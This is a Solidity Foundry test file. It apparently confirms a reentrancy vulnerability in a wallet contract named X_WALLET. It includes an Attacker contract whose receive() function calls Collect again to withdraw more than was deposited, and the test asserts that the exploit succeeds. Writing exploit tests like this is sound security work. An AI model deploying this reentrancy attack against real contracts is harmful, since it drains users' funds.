
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {StdStorage, stdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {X_WALLET} from "../src/X_WALLET.sol";
import {Log} from "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    using stdStorage for StdStorage;
    
    X_WALLET public _contractUnderTest;
    Log public _logContract;
    
    Attacker public _attacker;

    function setUp() public {
        _logContract = new Log();
        _contractUnderTest = new X_WALLET(address(_logContract));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal <= 10 ether);
        vm.assume(attackVal % 1 ether == 0);

        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 3);
        vm.deal(address(this), attackVal * 3);

        _attacker.setupAttack{value: attackVal}(attackVal);
        
        vm.warp(block.timestamp + 1 days + 1);
        
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = X_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(block.timestamp + 1 days);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        
        _victim.Collect(val);
        
        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.Collect(storedAttackVal);
        }
    }
}
